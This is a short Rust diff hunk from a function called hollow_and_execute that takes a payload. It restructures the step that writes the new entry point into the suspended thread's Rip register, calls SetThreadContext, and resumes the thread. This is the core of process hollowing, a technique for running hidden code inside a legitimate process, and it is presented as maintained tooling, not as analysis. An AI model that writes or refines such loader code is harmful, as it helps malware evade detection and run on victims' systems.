@@ -475,15 +475,15 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
                 std::mem::size_of::<usize>(),
                 &mut written,
             );
-        }
 
-        // Set new entry point (Rip, not Rcx — was 2.1 bug)
-        ctx.Rip = (remote_base + entry_point_rva) as u64;
-        if SetThreadContext(pi.hThread, &ctx) == 0 {
-            tracing::warn!(
-                "hollow_and_execute: SetThreadContext failed ({}); continuing",
-                winapi::um::errhandlingapi::GetLastError()
-            );
+            // Set new entry point (Rip, not Rcx — was 2.1 bug)
+            ctx.Rip = (remote_base + entry_point_rva) as u64;
+            if SetThreadContext(pi.hThread, &ctx) == 0 {
+                tracing::warn!(
+                    "hollow_and_execute: SetThreadContext failed ({}); continuing",
+                    winapi::um::errhandlingapi::GetLastError()
+                );
+            }
         }
         ResumeThread(pi.hThread);
 
